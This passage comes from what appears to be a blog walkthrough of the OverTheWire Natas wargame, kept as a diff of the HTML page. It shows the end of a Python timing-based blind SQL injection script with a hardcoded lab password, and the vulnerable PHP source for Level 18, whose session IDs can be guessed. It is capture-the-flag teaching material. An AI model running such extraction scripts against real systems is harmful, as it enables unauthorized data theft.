+        <span style="color:#111">resp</span> <span style="color:#f92672">=</span> <span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span>
+            <span style="color:#111">url</span> <span style="color:#f92672">+</span> <span style="color:#111">query</span><span style="color:#f92672">.</span><span style="color:#111">format</span><span style="color:#111">(</span><span style="color:#111">password</span> <span style="color:#f92672">+</span> <span style="color:#111">c</span><span style="color:#111">),</span>
+            <span style="color:#111">auth</span><span style="color:#f92672">=</span><span style="color:#111">(</span><span style="color:#d88200">&#34;natas17&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#34;</span><span style="color:#111">),</span>
+        <span style="color:#111">)</span>
+        <span style="color:#111">elapsed</span> <span style="color:#f92672">=</span> <span style="color:#111">time</span><span style="color:#f92672">.</span><span style="color:#111">time</span><span style="color:#111">()</span> <span style="color:#f92672">-</span> <span style="color:#111">sent</span>
+        <span style="color:#00a8c8">if</span> <span style="color:#111">elapsed</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span><span style="color:#111">:</span>
+            <span style="color:#111">password</span> <span style="color:#f92672">+=</span> <span style="color:#111">c</span>
+            <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">password</span><span style="color:#111">)</span>
+            <span style="color:#00a8c8">break</span>
+</code></pre></div><p>The new addition is the time calculation:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#111">sent</span> <span style="color:#f92672">=</span> <span style="color:#111">time</span><span style="color:#f92672">.</span><span style="color:#111">time</span><span style="color:#111">()</span>
+<span style="color:#111">elapsed</span> <span style="color:#f92672">=</span> <span style="color:#111">time</span><span style="color:#f92672">.</span><span style="color:#111">time</span><span style="color:#111">()</span> <span style="color:#f92672">-</span> <span style="color:#111">sent</span>
+</code></pre></div><p>Nothing major or relevant, if you&rsquo;re curious, check the <a href="https://docs.python.org/3.8/library/time.html">documentation</a>!</p>
+<p>Once more in no time, you&rsquo;ll have the password!</p>
+<h1 id="level-18">Level 18</h1>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+
+<span style="color:#111">$maxid</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">640</span><span style="color:#111">;</span> <span style="color:#75715e">// 640 should be enough for everyone
+</span><span style="color:#75715e"></span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">isValidAdminLogin</span><span style="color:#111">()</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]</span> <span style="color:#f92672">==</span> <span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#75715e">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
+        <span style="color:#75715e">//return 1;
+</span><span style="color:#75715e"></span>    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">isValidID</span><span style="color:#111">(</span><span style="color:#111">$id</span><span style="color:#111">)</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#75af00">is_numeric</span><span style="color:#111">(</span><span style="color:#111">$id</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">createID</span><span style="color:#111">(</span><span style="color:#111">$user</span><span style="color:#111">)</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">global</span> <span style="color:#111">$maxid</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#75af00">rand</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#111">$maxid</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">debug</span><span style="color:#111">(</span><span style="color:#111">$msg</span><span style="color:#111">)</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;debug&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_GET</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;DEBUG: </span><span style="color:#d88200">$msg</span><span style="color:#d88200">&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">my_session_start</span><span style="color:#111">()</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;PHPSESSID&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_COOKIE</span><span style="color:#111">)</span> <span style="color:#00a8c8">and</span> <span style="color:#75af00">isValidID</span><span style="color:#111">(</span><span style="color:#111">$_COOKIE</span><span style="color:#111">[</span><span style="color:#d88200">&#34;PHPSESSID&#34;</span><span style="color:#111">]))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#f92672">!</span><span style="color:#75af00">session_start</span><span style="color:#111">())</span> <span style="color:#111">{</span>
+            <span style="color:#75af00">debug</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Session start failed&#34;</span><span style="color:#111">);</span>
+            <span style="color:#00a8c8">return</span> <span style="color:#00a8c8">false</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+            <span style="color:#75af00">debug</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Session start ok&#34;</span><span style="color:#111">);</span>
+            <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#f92672">!</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_SESSION</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+                <span style="color:#75af00">debug</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Session was old: admin flag set&#34;</span><span style="color:#111">);</span>
+                <span style="color:#111">$_SESSION</span><span style="color:#111">[</span><span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span> <span style="color:#75715e">// backwards compatible, secure
+</span><span style="color:#75715e"></span>            <span style="color:#111">}</span>
+            <span style="color:#00a8c8">return</span> <span style="color:#00a8c8">true</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#00a8c8">false</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">print_credentials</span><span style="color:#111">()</span> <span style="color:#111">{</span> <span style="color:#75715e">/* {{{ */</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$_SESSION</span> <span style="color:#00a8c8">and</span> <span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_SESSION</span><span style="color:#111">)</span> <span style="color:#00a8c8">and</span> <span style="color:#111">$_SESSION</span><span style="color:#111">[</span><span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">]</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;&lt;pre&gt;Username: natas19</span><span style="color:#8045ff">\n</span><span style="color:#d88200">&#34;</span><span style="color:#111">;</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">/* }}} */</span>
+
+<span style="color:#111">$showform</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">true</span><span style="color:#111">;</span>
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">my_session_start</span><span style="color:#111">())</span> <span style="color:#111">{</span>
+    <span style="color:#75af00">print_credentials</span><span style="color:#111">();</span>
+    <span style="color:#111">$showform</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">false</span><span style="color:#111">;</span>
+<span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;password&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#75af00">session_id</span><span style="color:#111">(</span><span style="color:#75af00">createID</span><span style="color:#111">(</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]));</span>
+        <span style="color:#75af00">session_start</span><span style="color:#111">();</span>
+        <span style="color:#111">$_SESSION</span><span style="color:#111">[</span><span style="color:#d88200">&#34;admin&#34;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#75af00">isValidAdminLogin</span><span style="color:#111">();</span>
+        <span style="color:#75af00">debug</span><span style="color:#111">(</span><span style="color:#d88200">&#34;New session started&#34;</span><span style="color:#111">);</span>
+        <span style="color:#111">$showform</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">false</span><span style="color:#111">;</span>
+        <span style="color:#75af00">print_credentials</span><span style="color:#111">();</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span> 
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$showform</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></code></pre></div>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about">About</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#example">Example</a></li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&text=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&is_video=false&description=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Over%20The%20Wire%20-%20Natas%20Walkthrough&body=Check out this article: https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&title=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&name=Over%20The%20Wire%20-%20Natas%20Walkthrough&description=Level%200%20Using%20right-click%20anywhere%20on%20the%20page%20should%20show%20a%20menu%20from%20where%20you%20can%20select%20%26ldquo%3bView%20Page%20Source%26rdquo%3b%2c%20clicking%20it%20will%20show%20you%20the%20page%20source%20code.%20From%20where%20you%26rsquo%3bll%20see%3a%0a%26lt%3bdiv%20id%3d%26%2334%3bcontent%26%2334%3b%26gt%3b%20You%20can%20find%20the%20password%20for%20the%20next%20level%20on%20this%20page.%20%26lt%3b%21--The%20password%20for%20natas1%20is%20gtVrDuiDfck831PqWsLEZy5gyDz1clto%20--%26gt%3b%20%26lt%3b%2fdiv%26gt%3b%20We%20got%20our%20password%21%20Open%20http%3a%2f%2fnatas1.natas.labs.overthewire.org%2f%20and%20head%20on%20to%20the%20next%20level%21%0aLevel%201%20So%2c%20in%20this%20level%20they%20disabled%20right-clicking%20%28or%20at%20least%20they%20tried%2c%20in%20Firefox%20you%26rsquo%3bre%20able%20to%20right-click%20just%20fine%29.">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fotw%2fnatas%2f&t=Over%20The%20Wire%20-%20Natas%20Walkthrough">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  José Duarte 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/about">About</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+  
+
+
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    },
+    svg: {
+      fontCache: 'global'
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+
+</html>
